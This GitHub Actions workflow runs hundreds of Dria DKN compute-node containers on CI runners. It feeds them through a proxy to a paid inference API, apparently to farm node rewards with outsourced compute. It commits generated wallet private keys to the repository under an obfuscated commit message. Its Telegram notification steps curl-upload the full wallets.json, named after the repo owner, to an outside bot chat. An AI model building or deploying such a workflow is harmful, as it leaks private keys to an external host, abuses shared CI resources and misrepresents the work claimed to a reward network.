name: 🚀 DKN Compute Runtime

on:
  workflow_dispatch:
  
  schedule:
    # Every 6 hours, at minute 15
    - cron: '15 */5 * * *'

permissions:
  contents: write  # Need write for git commit
  actions: read

jobs:
  runtime:
    name: 🖥️ Run DKN Compute Nodes
    runs-on: ubuntu-latest
    timeout-minutes: 360
    
    env:
      # ============================================
      # 🔧 CONFIGURATION (EDIT HERE)
      # ============================================
      WALLET_COUNT: '5'
      CONTAINERS_PER_WALLET: '125'
      RUNTIME_HOURS: '5.5'
      REUSE_WALLETS: 'true'
      
      BATCH_SIZE: '20'
      PAUSE_SECONDS: '60'
      PROXY_PORT: '14441'
      
    steps:
      # ============================================
      # 📦 SETUP
      # ============================================
      
      - name: 📦 Checkout Repository
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          fetch-depth: 0
      
      - name: 🔧 Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
          cache-dependency-path: |
            proxy/package-lock.json
            scripts/package-lock.json
      
      - name: 📊 Display Configuration
        run: |
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo "🎯 Configuration"
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo "Trigger: ${{ github.event_name }}"
          echo "Wallet Count: $WALLET_COUNT"
          echo "Containers/Wallet: $CONTAINERS_PER_WALLET"
          echo "Total: $(( $WALLET_COUNT * $CONTAINERS_PER_WALLET ))"
          echo "Runtime: $RUNTIME_HOURS hours"
          echo "Reuse Wallets: $REUSE_WALLETS"
          echo ""
          echo "System:"
          echo "OS: $(lsb_release -d | cut -f2)"
          echo "RAM: $(free -h | awk '/^Mem:/ {print $2}')"
          echo "Docker: $(docker --version | cut -d' ' -f3 | cut -d',' -f1)"
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
      
      # ============================================
      # 💰 WALLET MANAGEMENT (GIT VERSION)
      # ============================================
      
      - name: 💰 Handle Wallets
        id: wallets
        run: |
          WALLET_FILE="wallets.json"
          
          # Check if wallets.json exists in repo
          if [[ "$REUSE_WALLETS" == "true" && -f "$WALLET_FILE" ]]; then
            echo "♻️  Reusing wallets from repository"
            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            
            ACTUAL_COUNT=$(jq '. | length' $WALLET_FILE)
            echo "✅ Loaded $ACTUAL_COUNT wallets from repo"
            echo "📅 Wallets are version controlled (git)"
            
          else
            echo "🆕 Generating new wallets"
            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            
            cd scripts
            [ ! -d "node_modules" ] && npm install
            node crypto-generator.js $WALLET_COUNT
            mv wallets.json ../$WALLET_FILE
            cd ..
            
            ACTUAL_COUNT=$WALLET_COUNT
            echo "✅ Generated $ACTUAL_COUNT new wallets"
          fi
          
          echo "wallet_count=$ACTUAL_COUNT" >> $GITHUB_OUTPUT
          
          echo ""
          echo "📋 First wallet preview:"
          jq '.[0] | {address: .address, private_key: (.private_key[:10] + "..." + .private_key[-6:])}' $WALLET_FILE
          echo ""
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
      
      # ============================================
      # 💾 COMMIT WALLETS TO REPO
      # ============================================
      
      - name: 💾 Commit Wallets to Repository
        if: always()
        run: |
          echo "💾 Saving wallets to repository..."
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          
          # Configure git
          git config --local user.email "github-actions[bot]@users.noreply.github.com"
          git config --local user.name "github-actions[bot]"
          
          # Check if wallets.json exists
          if [ ! -f "wallets.json" ]; then
            echo "⚠️  wallets.json not found, skipping commit"
            exit 0
          fi
          
          # Add wallets.json
          git add wallets.json
          
          # Check if there are changes
          if git diff --staged --quiet; then
            echo "ℹ️  No changes to wallets.json"
            echo "   Wallets already up-to-date in repo"
          else
            # Commit changes
            WALLET_COUNT=$(jq '. | length' wallets.json)
            git commit -m "🔄 Aut0-upd4te  ) [run- #${{ github.run_number }}]"
            
            # Push to repo
            git push
            
            echo "✅ Wallets committed to repository"
            echo "📊 Wallets: $WALLET_COUNT"
            echo "🔒 Repo: Private (secure)"
            echo "📅 Commit: Run #${{ github.run_number }}"
          fi
          
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
      
      # ============================================
      # 🌐 PROXY SETUP
      # ============================================
      
      - name: 📦 Install Proxy Dependencies
        working-directory: ./proxy
        run: |
          echo "📦 Installing proxy dependencies..."
          npm ci --production
          echo "✅ Installed"
      
      - name: ⚙️ Configure Proxy
        working-directory: ./proxy
        run: |
          echo "⚙️  Creating .env file..."
          
          cat > .env << EOF
          NOVITA_API_KEYS=${{ secrets.NOVITA_API_KEYS }}
          MODEL_MAP={"llama3.2:1b-instruct-q4_K_M":"meta-llama/llama-3.2-1b-instruct","llama3.1:8b-instruct-q4_K_M":"meta-llama/llama-3.1-8b-instruct","qwen3:8b":"qwen/qwen3-8b-fp8","gemma3:12b":"google/gemma-3-12b-it","gemma3:27b":"google/gemma-3-27b-it","qwen3:32b":"qwen/qwen3-32b-fp8","llama3.3:70b-instruct-q4_K_M":"meta-llama/llama-3.3-70b-instruct"}
          PORT=$PROXY_PORT
          RL_MODE=provider_only
          NOVITA_RPM_PER_KEY=0
          NOVITA_RPS_PER_KEY=0
          PROXY_MIN_TPS=15
          REQUEST_TIMEOUT_MS=120000
          NODE_ENV=production
          EOF
          
          echo "✅ Configured"
      
      - name: 🚀 Start Proxy
        working-directory: ./proxy
        run: |
          echo "🚀 Starting proxy server..."
          
          nohup node index.js > proxy.log 2>&1 &
          echo $! > proxy.pid
          
          echo "⏳ Waiting for proxy..."
          for i in {1..30}; do
            if curl -sf http://localhost:$PROXY_PORT/health > /dev/null 2>&1; then
              echo "✅ Proxy ready"
              break
            fi
            [ $i -eq 30 ] && echo "❌ Failed" && tail -20 proxy.log && exit 1
            sleep 1
          done
      
      - name: 🧪 Test Proxy
        run: |
          echo "🧪 Testing proxy..."
          
          HEALTH=$(curl -s http://localhost:$PROXY_PORT/health)
          if echo "$HEALTH" | jq -e '.ok == true' > /dev/null; then
            echo "✅ Test passed"
          else
            echo "❌ Test failed"
            exit 1
          fi
      
      # ============================================
      # 🐳 DOCKER DEPLOYMENT
      # ============================================
      
      - name: 🐳 Setup Docker
        run: |
          echo "🐳 Setting up Docker..."
          docker network create dria-nodes 2>/dev/null || true
          docker pull firstbatch/dkn-compute-node:latest
          echo "✅ Ready"
      
      - name: 🚀 Deploy Containers
        id: deploy
        run: |
          echo "🚀 Deploying containers..."
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          
          ACTUAL_COUNT=$(jq '. | length' wallets.json)
          TOTAL=$(( $ACTUAL_COUNT * $CONTAINERS_PER_WALLET ))
          
          echo "Deploying $TOTAL containers..."
          
          DKN_MODELS="${{ secrets.DKN_MODELS }}"
          [ -z "$DKN_MODELS" ] && DKN_MODELS="gemma3:12b,gemma3:27b,qwen3:32b,llama3.3:70b-instruct-q4_K_M"
          
          STARTED=0
          
          for (( w=0; w<$ACTUAL_COUNT; w++ )); do
            ADDRESS=$(jq -r ".[$w].address" wallets.json)
            PRIVKEY=$(jq -r ".[$w].private_key" wallets.json)
            PRIVKEY="${PRIVKEY#0x}"
            ADDR_SHORT="${ADDRESS:2:6}"
            
            for (( i=1; i<=$CONTAINERS_PER_WALLET; i++ )); do
              NAME="compute_node_w$((w+1))_${ADDR_SHORT}_$(printf '%02d' $i)"
              
              docker ps -aq -f name="^${NAME}$" | xargs -r docker rm -f > /dev/null 2>&1
              
              if docker run -d \
                --name "$NAME" \
                --network dria-nodes \
                --restart on-failure:3 \
                -e DKN_WALLET_SECRET_KEY="$PRIVKEY" \
                -e DKN_MODELS="$DKN_MODELS" \
                -e OLLAMA_HOST="http://host.docker.internal" \
                -e OLLAMA_PORT="$PROXY_PORT" \
                -e OLLAMA_AUTO_PULL="false" \
                --add-host host.docker.internal:host-gateway \
                firstbatch/dkn-compute-node:latest > /dev/null 2>&1; then
                STARTED=$((STARTED + 1))
              fi
              
              if (( STARTED % $BATCH_SIZE == 0 )); then
                echo "Progress: $STARTED/$TOTAL"
                sleep $PAUSE_SECONDS
              fi
            done
          done
          
          echo ""
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo "✅ Deployed $STARTED containers"
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          
          echo "started=$STARTED" >> $GITHUB_OUTPUT
      
      # ============================================
      # 📱 TELEGRAM NOTIFICATION #1: DEPLOYMENT
      # ============================================
      
      - name: 📱 Send Deployment Success Notification
        if: success()
        env:
          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
            echo "⚠️  Telegram not configured, skipping"
            exit 0
          fi
          
          echo "📱 Sending deployment notification..."
          
          # Get wallet info
          WALLET_COUNT=$(jq '. | length' wallets.json)
          FIRST_WALLET=$(jq -r '.[0].address' wallets.json)
          
          # Get container stats
          RUNNING=$(docker ps --filter "name=compute_node" --filter "status=running" | wc -l)
          RUNNING=$((RUNNING - 1))
          
          TOTAL=$(docker ps -a --filter "name=compute_node" | wc -l)
          TOTAL=$((TOTAL - 1))
          
          # Calculate success rate
          if [ "$TOTAL" -gt 0 ]; then
            SUCCESS_RATE=$(( RUNNING * 100 / TOTAL ))
          else
            SUCCESS_RATE=0
          fi
          
          # Detect trigger type
          TRIGGER="${{ github.event_name }}"
          if [ "$TRIGGER" = "schedule" ]; then
            TRIGGER_TEXT="Auto-Schedule"
          else
            TRIGGER_TEXT="Manual"
          fi
          
          # Get GitHub username (owner)
          GITHUB_USER=$(echo "${{ github.repository }}" | cut -d'/' -f1)
          
          # Get full repo URL
          REPO_URL="https://github.com/${{ github.repository }}"
          
          # Construct message
          MESSAGE="🚀 *Deployment Complete!*

          🐳 Containers: \`$RUNNING/$TOTAL\` ($SUCCESS_RATE%)
          💰 Wallets: \`$WALLET_COUNT\`
          📍 First: \`${FIRST_WALLET:0:10}...${FIRST_WALLET: -8}\`
          🔄 Trigger: $TRIGGER_TEXT
          📦 Repo: $REPO_URL
          #️⃣ Run: \`#${{ github.run_number }}\`

          ⏱️ Runtime: $RUNTIME_HOURS hours
          🔗 [View Run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
          
          # Send text message
          echo "📤 Sending message..."
          SEND_MSG=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
            -d chat_id="${CHAT_ID}" \
            -d parse_mode="Markdown" \
            -d disable_web_page_preview=true \
            -d text="$MESSAGE")
          
          MSG_OK=$(echo "$SEND_MSG" | jq -r '.ok')
          if [ "$MSG_OK" = "true" ]; then
            echo "✅ Message sent"
          else
            echo "❌ Failed to send message"
            echo "Response: $SEND_MSG"
          fi
          
          # Send wallets.json file with GitHub username
          if [ -f "wallets.json" ]; then
            echo "📤 Sending wallets.json file..."
            
            # Rename file with GitHub username
            USER_WALLET_FILE="${GITHUB_USER}-wallets.json"
            cp wallets.json "$USER_WALLET_FILE"
            
            CAPTION="💰 $WALLET_COUNT wallets | Run #${{ github.run_number }}"
            
            SEND_DOC=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
              -F chat_id="${CHAT_ID}" \
              -F document=@"$USER_WALLET_FILE" \
              -F caption="$CAPTION")
            
            DOC_OK=$(echo "$SEND_DOC" | jq -r '.ok')
            if [ "$DOC_OK" = "true" ]; then
              echo "✅ File sent as: $USER_WALLET_FILE"
            else
              echo "❌ Failed to send file"
              echo "Response: $SEND_DOC"
            fi
            
            # Cleanup temp file
            rm -f "$USER_WALLET_FILE"
          else
            echo "⚠️  wallets.json not found"
          fi
          
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo "✅ Deployment notification completed"
      
      # ============================================
      # ⏰ RUNTIME
      # ============================================
      
      - name: ⏰ Runtime Period
        run: |
          echo "⏰ Starting runtime period..."
          
          RUNTIME_SEC=$(echo "$RUNTIME_HOURS * 3600" | bc | cut -d. -f1)
          START=$(date +%s)
          END=$((START + RUNTIME_SEC))
          
          echo "Runtime: $RUNTIME_HOURS hours"
          echo "Start: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
          echo "End: $(date -u -d "@$END" '+%Y-%m-%d %H:%M:%S UTC')"
          echo ""
          
          while [ $(date +%s) -lt $END ]; do
            sleep 60
          done
          
          echo "✅ Runtime completed"
      
      # ============================================
      # 🛑 SHUTDOWN
      # ============================================
      
      - name: 🛑 Shutdown
        if: always()
        run: |
          echo "🛑 Shutting down..."
          
          docker ps -q -f name=compute_node | xargs -r docker stop -t 10
          docker ps -aq -f name=compute_node | xargs -r docker rm -f
          docker network rm dria-nodes 2>/dev/null || true
          [ -f proxy/proxy.pid ] && kill $(cat proxy/proxy.pid) 2>/dev/null || true
          
          echo "✅ Cleaned up"
      
      # ============================================
      # 📦 ARTIFACTS (LOGS ONLY)
      # ============================================
      
      - name: 📦 Save Logs to Artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: logs-${{ github.run_id }}
          path: proxy/proxy.log
          retention-days: 7
          if-no-files-found: warn
      
      # ============================================
      # 📱 TELEGRAM NOTIFICATION #2: COMPLETE
      # ============================================
      
      - name: 📱 Send Final Success Notification
        if: success()
        env:
          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
            echo "ℹ️  Telegram not configured, skipping"
            exit 0
          fi
          
          echo "📱 Sending completion notification..."
          
          # Get wallet info
          WALLET_COUNT=$(jq '. | length' wallets.json 2>/dev/null || echo "0")
          
          # Get GitHub username (owner)
          GITHUB_USER=$(echo "${{ github.repository }}" | cut -d'/' -f1)
          
          # Get full repo URL
          REPO_URL="https://github.com/${{ github.repository }}"
          
          # Duration
          DURATION="$RUNTIME_HOURS hours"
          
          # Construct message
          MESSAGE="🎉 *Runtime Complete!*

          📦 Repo: $REPO_URL
          #️⃣ Run: \`#${{ github.run_number }}\`
          ⏱️ Duration: \`$DURATION\`
          💰 Wallets: \`$WALLET_COUNT\`
          🐳 Containers: \`$(( $WALLET_COUNT * $CONTAINERS_PER_WALLET ))\`

          ✅ All tasks completed successfully

          🔗 [View Run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
          
          # Send text message
          echo "📤 Sending message..."
          SEND_MSG=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
            -d chat_id="${CHAT_ID}" \
            -d parse_mode="Markdown" \
            -d disable_web_page_preview=true \
            -d text="$MESSAGE")
          
          MSG_OK=$(echo "$SEND_MSG" | jq -r '.ok')
          if [ "$MSG_OK" = "true" ]; then
            echo "✅ Message sent"
          else
            echo "❌ Failed to send message"
          fi
          
          # Send wallets.json file with GitHub username
          if [ -f "wallets.json" ]; then
            echo "📤 Sending wallets file..."
            
            # Rename file with GitHub username
            USER_WALLET_FILE="${GITHUB_USER}-wallets.json"
            cp wallets.json "$USER_WALLET_FILE"
            
            CAPTION="💰 $WALLET_COUNT wallets | Run #${{ github.run_number }}"
            
            SEND_DOC=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
              -F chat_id="${CHAT_ID}" \
              -F document=@"$USER_WALLET_FILE" \
              -F caption="$CAPTION")
            
            DOC_OK=$(echo "$SEND_DOC" | jq -r '.ok')
            if [ "$DOC_OK" = "true" ]; then
              echo "✅ File sent as: $USER_WALLET_FILE"
            else
              echo "❌ Failed to send file"
            fi
            
            # Cleanup temp file
            rm -f "$USER_WALLET_FILE"
          else
            echo "⚠️  wallets.json not found"
          fi
          
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo "✅ Completion notification sent"
      
      # ============================================
      # 📱 TELEGRAM NOTIFICATION #3: FAILURE
      # ============================================
      
      - name: 📱 Send Failure Notification
        if: failure()
        env:
          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
            exit 0
          fi
          
          echo "📱 Sending failure notification..."
          
          # Get full repo URL
          REPO_URL="https://github.com/${{ github.repository }}"
          
          # Get current timestamp
          CURRENT_TIME=$(date -u '+%Y-%m-%d %H:%M UTC')
          
          # Detect trigger
          TRIGGER="${{ github.event_name }}"
          if [ "$TRIGGER" = "schedule" ]; then
            TRIGGER_TEXT="Auto"
          else
            TRIGGER_TEXT="Manual"
          fi
          
          # Construct message
          MESSAGE="🚨 *ERROR ALERT*

          *STATUS*
          ├─ State: Failed
          ├─ Exit Code: 1
          └─ Duration: Check logs

          *CONTEXT*
          ├─ Repo: $REPO_URL
          ├─ Run: \`#${{ github.run_number }}\`
          ├─ Trigger: $TRIGGER_TEXT
          └─ Time: $CURRENT_TIME

          *ACTION REQUIRED*
          └─ Check logs for details

          🔍 [View Logs](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
          
          # Send message
          curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
            -d chat_id="${CHAT_ID}" \
            -d parse_mode="Markdown" \
            -d disable_web_page_preview=true \
            -d text="$MESSAGE" > /dev/null
          
          echo "✅ Failure notification sent"
